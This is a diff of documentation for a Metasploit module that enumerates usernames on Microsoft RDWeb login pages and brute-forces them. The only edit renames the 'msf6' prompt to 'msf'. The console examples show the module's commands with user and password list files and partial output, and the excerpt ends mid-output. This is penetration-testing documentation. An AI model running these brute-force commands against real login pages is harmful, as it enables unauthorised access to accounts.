@@ -49,12 +49,12 @@ An alternate User Agent string to use in HTTP requests. Defaults to Mozilla/5.0 
 If an RDWeb login page is discovered, you can use this module to gather valid usernames for a brute force attack.
 
 Specific target output replaced with Ys so as not to disclose information
-```msf6 > use auxiliary/scanner/http/rdp_web_login
-msf6 auxiliary(scanner/http/rdp_web_login) > set username /home/kali/users.txt
+```msf > use auxiliary/scanner/http/rdp_web_login
+msf auxiliary(scanner/http/rdp_web_login) > set username /home/kali/users.txt
 username => /home/kali/users.txt
-msf6 auxiliary(scanner/http/rdp_web_login) > set RHOSTS YY.YYY.YYY.YY
+msf auxiliary(scanner/http/rdp_web_login) > set RHOSTS YY.YYY.YYY.YY
 RHOSTS => YY.YYY.YYY.YY
-msf6 auxiliary(scanner/http/rdp_web_login) > run
+msf auxiliary(scanner/http/rdp_web_login) > run
 
 [*] Running for YY.YYY.YYY.YY...
 [+] Found Domain: YYYYYYYYYYYY
@@ -65,16 +65,16 @@ msf6 auxiliary(scanner/http/rdp_web_login) > run
 [*] Auxiliary module execution completed```
 
 If an RDWeb login page is discovered, you can use this module to perform a brute force attack.
-```msf6 > use auxiliary/scanner/http/rdp_web_login
-msf6 auxiliary(scanner/http/rdp_web_login) > set RHOSTS 192.168.148.128
+```msf > use auxiliary/scanner/http/rdp_web_login
+msf auxiliary(scanner/http/rdp_web_login) > set RHOSTS 192.168.148.128
 RHOSTS => 192.168.148.128
-msf6 auxiliary(scanner/http/rdp_web_login) > set username /home/kali/users.txt
+msf auxiliary(scanner/http/rdp_web_login) > set username /home/kali/users.txt
 username => /home/kali/users.txt
-msf6 auxiliary(scanner/http/rdp_web_login) > set password /home/kali/passwords.txt
+msf auxiliary(scanner/http/rdp_web_login) > set password /home/kali/passwords.txt
 password => /home/kali/passwords.txt
-msf6 auxiliary(scanner/http/rdp_web_login) > set timeout 500
+msf auxiliary(scanner/http/rdp_web_login) > set timeout 500
 timeout => 500
-msf6 auxiliary(scanner/http/rdp_web_login) > run
+msf auxiliary(scanner/http/rdp_web_login) > run
 
 [*] Running for YY.YYY.YYY.YY...
 [+] Found Domain: YYYY
